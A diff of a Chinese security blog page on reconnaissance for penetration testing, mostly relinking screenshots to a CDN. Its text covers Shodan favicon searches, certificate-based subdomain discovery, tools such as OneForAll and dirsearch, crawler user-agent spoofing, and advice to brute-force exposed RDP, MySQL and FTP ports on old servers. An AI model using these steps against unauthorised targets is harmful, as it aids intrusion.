     </a></p>
 <h2 id="4logo" class="headerLink">
     <a href="#4logo" class="header-mark"></a>4、logo</h2><p>当你不确定目标产品是什么时，比如你不知道他是谁家的WAF或者路由器，可以利用查看网站logo地址，然后复制logo地址，点击按图片搜索，到谷歌里面查询；也可以把目标logo下载下来，利用上传图片来查询，通过搜索出来的结果可以判断目标产品和厂商。</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-19fe23983d34793a19756320b38c79aaccbde945.png" title="image-20240318213245804" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-19fe23983d34793a19756320b38c79aaccbde945.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-19fe23983d34793a19756320b38c79aaccbde945.png" title="image-20240318213245804" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-19fe23983d34793a19756320b38c79aaccbde945.png">
         
     </a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-b0b27b2a69daa400657d01b1456b36f5a58b7909.png" title="image-20240318213250034" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-b0b27b2a69daa400657d01b1456b36f5a58b7909.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-b0b27b2a69daa400657d01b1456b36f5a58b7909.png" title="image-20240318213250034" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-b0b27b2a69daa400657d01b1456b36f5a58b7909.png">
         
     </a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-f751011831118cbbad3a3af63d1fe895e045f4d1.png" title="image-20240318214058575" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-f751011831118cbbad3a3af63d1fe895e045f4d1.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-f751011831118cbbad3a3af63d1fe895e045f4d1.png" title="image-20240318214058575" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-f751011831118cbbad3a3af63d1fe895e045f4d1.png">
         
     </a></p>
 <h2 id="5faviconico" class="headerLink">
     <a href="#5faviconico" class="header-mark"></a>5、favicon.ico</h2><p>首先先来介绍一下什么favicon.ico文件，所谓favicon，便是其可以让浏览器的收藏夹中除显示相应的标题外，还以图标的方式区别不同的网站。favicon.ico也被称为 website icon（网页图标）、page icon（页面图标）或url icon（URL图标），具体细节请问度娘。下面这个小东西就是 Favicon.ico，我们可以通过在shodan里寻找它的哈希并去查找相关资产，打开shodan页面，或者用shodan插件都行。</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-3afa9d1b3afa239c35e19284955beb2a884e13be.png" title="image-20240318214108788" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-3afa9d1b3afa239c35e19284955beb2a884e13be.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-3afa9d1b3afa239c35e19284955beb2a884e13be.png" title="image-20240318214108788" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-3afa9d1b3afa239c35e19284955beb2a884e13be.png">
         
     </a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-93ada0eed3bb7559a73a349725fdba1fb9821864.png" title="image-20240318214114650" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-93ada0eed3bb7559a73a349725fdba1fb9821864.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-93ada0eed3bb7559a73a349725fdba1fb9821864.png" title="image-20240318214114650" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-93ada0eed3bb7559a73a349725fdba1fb9821864.png">
         
     </a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-83c0cb9582210821838fd7c6e478b07c66a59022.png" title="image-20240318214142064" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-83c0cb9582210821838fd7c6e478b07c66a59022.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-83c0cb9582210821838fd7c6e478b07c66a59022.png" title="image-20240318214142064" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-83c0cb9582210821838fd7c6e478b07c66a59022.png">
         
     </a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-5dd1a1e922e1f5b8952a15e74b691026b73747aa.png" title="image-20240318214154617" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-5dd1a1e922e1f5b8952a15e74b691026b73747aa.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-5dd1a1e922e1f5b8952a15e74b691026b73747aa.png" title="image-20240318214154617" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-5dd1a1e922e1f5b8952a15e74b691026b73747aa.png">
         
     </a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-237c3d3113fe9b9a3189becf8a57907fc8016bf4.png" title="image-20240318214159248" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-237c3d3113fe9b9a3189becf8a57907fc8016bf4.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-237c3d3113fe9b9a3189becf8a57907fc8016bf4.png" title="image-20240318214159248" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-237c3d3113fe9b9a3189becf8a57907fc8016bf4.png">
         
     </a></p>
 <h2 id="三子域名收集挖掘" class="headerLink">
     <a href="#%e4%b8%89%e5%ad%90%e5%9f%9f%e5%90%8d%e6%94%b6%e9%9b%86%e6%8c%96%e6%8e%98" class="header-mark"></a>三、子域名收集(挖掘)</h2><h2 id="1sslhttps证书" class="headerLink">
     <a href="#1sslhttps%e8%af%81%e4%b9%a6" class="header-mark"></a>1、SSL(HTTPS)证书</h2><p>点击浏览器网站旁边的小锁，然后点击证书就可以查看到该网站的SSL证书了</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-a6949b5126971885b1789786f3fbecb076868c0c.png" title="image-20240318214253774" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-a6949b5126971885b1789786f3fbecb076868c0c.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-a6949b5126971885b1789786f3fbecb076868c0c.png" title="image-20240318214253774" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-a6949b5126971885b1789786f3fbecb076868c0c.png">
         
     </a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-7f5be2e3ea1d8a7e9505b44e446bd05a1cc7a454.png" title="image-20240318214300153" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-7f5be2e3ea1d8a7e9505b44e446bd05a1cc7a454.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-7f5be2e3ea1d8a7e9505b44e446bd05a1cc7a454.png" title="image-20240318214300153" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-7f5be2e3ea1d8a7e9505b44e446bd05a1cc7a454.png">
         
     </a></p>
 <h3 id="11大厂商ssl证书一证多用" class="headerLink">
     <a href="#11%e5%a4%a7%e5%8e%82%e5%95%86ssl%e8%af%81%e4%b9%a6%e4%b8%80%e8%af%81%e5%a4%9a%e7%94%a8" class="header-mark"></a>1.1、大厂商SSL证书一证多用</h3><p>大厂商的SSL证书一般都是<strong>一证多用</strong>，根据证书透明日志这个特性，可以得知一些子域名。</p>
 <p>如百度：<a href="https://www.baidu.com/" target="_blank" rel="noopener noreferrer">https://www.baidu.com</a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-1e7449610f26d26e979b950228ae3b24db5d8ccd.png" title="image-20240318214312481" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-1e7449610f26d26e979b950228ae3b24db5d8ccd.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-1e7449610f26d26e979b950228ae3b24db5d8ccd.png" title="image-20240318214312481" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-1e7449610f26d26e979b950228ae3b24db5d8ccd.png">
         
     </a></p>
 <p>如搜狐：<a href="https://vpn.sohu-inc.com/" target="_blank" rel="noopener noreferrer">https://vpn.sohu-inc.com</a></p>
 <h3 id="12https证书错误泄露域名" class="headerLink">
     <a href="#12https%e8%af%81%e4%b9%a6%e9%94%99%e8%af%af%e6%b3%84%e9%9c%b2%e5%9f%9f%e5%90%8d" class="header-mark"></a>1.2、HTTPS证书错误泄露域名</h3><p>有时候https证书报错会泄露域名</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-5e919d93be3284e3dfe8646b93514ef68cf37a9f.png" title="image-20240318214545325" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-5e919d93be3284e3dfe8646b93514ef68cf37a9f.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-5e919d93be3284e3dfe8646b93514ef68cf37a9f.png" title="image-20240318214545325" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-5e919d93be3284e3dfe8646b93514ef68cf37a9f.png">
         
     </a></p>
 <h3 id="13在线网站证书查询" class="headerLink">
     <a href="#13%e5%9c%a8%e7%ba%bf%e7%bd%91%e7%ab%99%e8%af%81%e4%b9%a6%e6%9f%a5%e8%af%a2" class="header-mark"></a>1.3、在线网站证书查询</h3><p><a href="https://crt.sh/" target="_blank" rel="noopener noreferrer">https://crt.sh/</a></p>
 <p><a href="https://censys.io/" target="_blank" rel="noopener noreferrer">https://censys.io/</a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-4e6667b1e50d27f18d67cbb72cd30906570fd805.png" title="image-20240318214636905" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-4e6667b1e50d27f18d67cbb72cd30906570fd805.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-4e6667b1e50d27f18d67cbb72cd30906570fd805.png" title="image-20240318214636905" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-4e6667b1e50d27f18d67cbb72cd30906570fd805.png">
         
     </a></p>
 <h2 id="2网络深度爬虫" class="headerLink">
@@ -878,7 +878,7 @@
 <p>server 命令参数设定查询将要使用的DNS服务器;针对某个域名可先输入域名获取dns信息。</p>
 <p>ls命令列出某个域中的所有域名;如果太长不适合查看可定向保存至文件夹中。</p>
 <p>exit命令退出</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-ddea2b5312329a51ed12f3c88fbdabc0c0c97f2d.png" title="image-20240318214733140" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-ddea2b5312329a51ed12f3c88fbdabc0c0c97f2d.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-ddea2b5312329a51ed12f3c88fbdabc0c0c97f2d.png" title="image-20240318214733140" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-ddea2b5312329a51ed12f3c88fbdabc0c0c97f2d.png">
         
     </a></p>
 <h2 id="4在线dns数据" class="headerLink">
@@ -907,11 +907,11 @@
 <p>也就是说，<strong>如果一个域名他的泛解析是一个CNAME记录而且这又是一个CDN域名</strong>(恰巧这个又不少)，那么不是自己定制的dns查询函数，一般都会出现大量泛解析误报。这就有点像是灯下黑，知道了怎么做就可以了，却一直没有解决的办法。</p>
 <p>如果要自己定制的话需要研究一下DNS报文协议，这里引用两张图片做简要分析</p>
 <p>这是向DNS请求部分的：</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-3a54865a6b9d86c5d9a35ba4260e231a94f5d1af.png" title="image-20240318215406584" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-3a54865a6b9d86c5d9a35ba4260e231a94f5d1af.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-3a54865a6b9d86c5d9a35ba4260e231a94f5d1af.png" title="image-20240318215406584" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-3a54865a6b9d86c5d9a35ba4260e231a94f5d1af.png">
         
     </a></p>
 <p>这是DNS服务器回传的报文：</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-7b3a549629a1d72960f6589a53e358481a97e2ea.png" title="image-20240318215636520" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-7b3a549629a1d72960f6589a53e358481a97e2ea.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-7b3a549629a1d72960f6589a53e358481a97e2ea.png" title="image-20240318215636520" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-7b3a549629a1d72960f6589a53e358481a97e2ea.png">
         
     </a></p>
 <p>只需要按照这个协议的格式做正则提取即可获得我们想要的信息，A记录的是固定的正则，CNAME记录需要嵌套一层正则才能获取。</p>
@@ -925,23 +925,23 @@
     <a href="#91oneforall" class="header-mark"></a>9.1、OneForAll</h3><p>下载地址：<a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener noreferrer">https://github.com/shmilylty/OneForAll</a></p>
 <p>目前支持一键收集：子域、子域常用端口、子域Title、子域状态、子域服务器等</p>
 <p>020_信息收集_子域名OneForAll</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-d458cc2121cc80f9372c2aa98d85c293e99ba1c9.png" title="image-20240318220750492" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-d458cc2121cc80f9372c2aa98d85c293e99ba1c9.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-d458cc2121cc80f9372c2aa98d85c293e99ba1c9.png" title="image-20240318220750492" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-d458cc2121cc80f9372c2aa98d85c293e99ba1c9.png">
         
     </a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-38fe8dfe06c49f4131b75270360e3d44f3788bfe.png" title="image-20240318220755282" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-38fe8dfe06c49f4131b75270360e3d44f3788bfe.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-38fe8dfe06c49f4131b75270360e3d44f3788bfe.png" title="image-20240318220755282" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-38fe8dfe06c49f4131b75270360e3d44f3788bfe.png">
         
     </a></p>
 <h3 id="92subdomainbrute" class="headerLink">
     <a href="#92subdomainbrute" class="header-mark"></a>9.2、subDomainBrute</h3><p>工具地址： <a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener noreferrer">https://github.com/lijiejie/subDomainsBrute</a></p>
 <p>高并发的DNS暴力枚举工具</p>
 <p>020_信息收集_子域名subDomainsBrute</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-944cc4b5a7746ebe86c542130929900239d49ed3.png" title="image-20240318223332308" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-944cc4b5a7746ebe86c542130929900239d49ed3.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-944cc4b5a7746ebe86c542130929900239d49ed3.png" title="image-20240318223332308" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-944cc4b5a7746ebe86c542130929900239d49ed3.png">
         
     </a></p>
 <h3 id="93layer" class="headerLink">
     <a href="#93layer" class="header-mark"></a>9.3、Layer</h3><p>Layer子域名挖掘机是一款域名查询工具，可提供网站子域名查询服务；拥有简洁的界面、简单的操作模式，支持服务接口、暴力搜索、同服挖掘三种模式，支持打开网站、复制域名、复制IP、复制CDN、导出域名、导出IP、导出域名+IP、导出域名+IP+WEB服务器以及导出存活网站！</p>
 <p>通过查看WEB服务器信息，筛选版本比较低的服务器（win2003+iis6.0），查看每个子域名是否开启常见的端口（3389、3306、21端口等），利用爆破工具进行枚举，会达到事半功倍的效果。</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-b7f69762bfd198a51b4f205c45d69ea1682a42bf.png" title="image-20240318223844214" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-b7f69762bfd198a51b4f205c45d69ea1682a42bf.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-b7f69762bfd198a51b4f205c45d69ea1682a42bf.png" title="image-20240318223844214" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-b7f69762bfd198a51b4f205c45d69ea1682a42bf.png">
         
     </a></p>
 <h3 id="94fuzsub" class="headerLink">
@@ -1034,7 +1034,7 @@
 <h2 id="1dirsearch" class="headerLink">
     <a href="#1dirsearch" class="header-mark"></a>1、dirsearch</h2><p>工具地址：<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener noreferrer">https://github.com/maurosoria/dirsearch</a></p>
 <p>002_目录信息_dirsearch</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-cd2731804d040fd44ab39c011b263b8128b2a908.png" title="image-20240318223946570" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-cd2731804d040fd44ab39c011b263b8128b2a908.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-cd2731804d040fd44ab39c011b263b8128b2a908.png" title="image-20240318223946570" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-cd2731804d040fd44ab39c011b263b8128b2a908.png">
         
     </a></p>
 <h2 id="2dirbuster" class="headerLink">
@@ -1044,12 +1044,12 @@
 <p>Mozilla/5.0 (compatible; Googlebot/2.1; <a href="http://www.google.com/bot.html" target="_blank" rel="noopener noreferrer">http://www.google.com/bot.html</a>) 谷歌蜘蛛抓取欺骗</p>
 <p>Firefox 3.6 Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.8;baidu Transcoder) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729) 百度转码浏览欺骗</p>
 <p>Chrome Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14 谷歌转码浏览欺骗</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-dff5d1680324323642d895b1451522b43dd28b1c.png" title="image-20240318224002259" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-dff5d1680324323642d895b1451522b43dd28b1c.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-dff5d1680324323642d895b1451522b43dd28b1c.png" title="image-20240318224002259" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-dff5d1680324323642d895b1451522b43dd28b1c.png">
         
     </a></p>
 <h2 id="37kbscan" class="headerLink">
